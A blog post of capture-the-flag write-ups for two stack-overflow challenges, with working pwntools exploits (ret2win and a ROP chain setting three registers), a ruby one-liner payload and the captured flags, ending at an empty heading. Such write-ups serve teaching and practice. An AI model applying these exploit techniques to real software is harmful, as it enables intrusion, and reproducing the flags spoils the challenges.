---

layout: post
title: "Cat The Flag v2"
date: 2025-10-06 13:00:00 +0000
categories: [ctf-writeups, Cat The Flag v2]
tags: 
summary: "my writeups for picoCTF - picoGym Challenges."
author: Mensi Mohamed Amine
toc: true
math: false
comments: true
---


## Compromised 

### solution 

In this task we are given an executable file, the first thing i did was inspecting the executable with `file` utility which indicate a x64 dynamically linked, non-stripped binary.

![Alt Text](/assets/posts/ctf-enit-2025/compromised/1.png)

then i checked the binary mitigations using pwntools `checksec` utility which shows `no canary` and `pie disabled`

![Alt Text](/assets/posts/ctf-enit-2025/compromised/2.png)

After that i opened the binary inside `IDA pro` to perform some static analysis on the decompiled code.

reviewing the decompiled code i noticed a `win` function that read `flag.txt` file.
![Alt Text](/assets/posts/ctf-enit-2025/compromised/3.png)

also there is a `vulnerable_function` called in `main`.

![Alt Text](/assets/posts/ctf-enit-2025/compromised/4.png)

reviewing `vulnerable_function` we can notice the call for `gets` function that doesn't perform any bound checking for the user input which can overwrite the stack.

![Alt Text](/assets/posts/ctf-enit-2025/compromised/5.png)

So basically this is a very classic `ret2win` challenge, to solve this task all we have to do is overwriting the return address to execute our `win` function and get the flag.

### manual exploit

```ruby
ruby -e 'puts "A" * 40 + "\x24\x15\x40"' | ./compromised
```

### manual exploit output

![Alt Text](/assets/posts/ctf-enit-2025/compromised/6.png)

### exploit
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template compromised --host 192.168.1.32 --port 15024
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'compromised')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '192.168.1.32'
port = int(args.PORT or 15024)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.recvuntil(b'>>> ')
payload = flat (
        b'A' * 40,
        exe.sym.win
)
io.sendline(payload)


io.interactive()

```

### exploit output

![Alt Text](/assets/posts/ctf-enit-2025/compromised/7.png)

### flag 

```
Securinets{c0mpr0m153d_1337}
```


## Compromised 1

this challenge is basically the same as `Compromised` challenge. the only difference is in this challenge `win` function have 3 arguments.

![Alt Text](/assets/posts/ctf-enit-2025/compromised_1/1.png)

So to solve this challenge we should control our registers specifically `rdi`, `rsi` and `rdx` before overwriting the return address with `win` function address.
for that we will create a ropchain, by chaining three gadgets and we will use `ROPgadget` tool to see the available gadgets.

![Alt Text](/assets/posts/ctf-enit-2025/compromised_1/2.png)

we will use these three gadgets to pass the needed arguments to the correspondant registers :

`0xdeadbeaf` -> `rdi`
`0xc0debabe` -> `rsi`
`0x1337`     -> `rdx`

![Alt Text](/assets/posts/ctf-enit-2025/compromised_1/3.png)

### exploit
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template compromised_1 --host 192.168.1.32 --port 15025
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'compromised_1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '192.168.1.32'
port = int(args.PORT or 15025)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.recvuntil(b'>>> ')
rop = ROP(exe)

pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0] 
pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret'])[0] 
pop_rdx_ret = rop.find_gadget(['pop rdx', 'ret'])[0]

payload = b"A" * 40
payload += p64(pop_rdi_ret)
payload += p64(0xdeadbeafdeadbeaf)
payload += p64(pop_rsi_ret) 
payload += p64(0xc0debabec0debabe) 
payload += p64(pop_rdx_ret)
payload += p64(0x1337)  
payload += p64(exe.sym.win)
io.sendline(payload)

io.interactive()

```


### exploit output

![Alt Text](/assets/posts/ctf-enit-2025/compromised_1/4.png)

### flag

```
Securinets{c0mprom1s3d_0wn3d_b3yond_fixing}
```


## Dead Drop
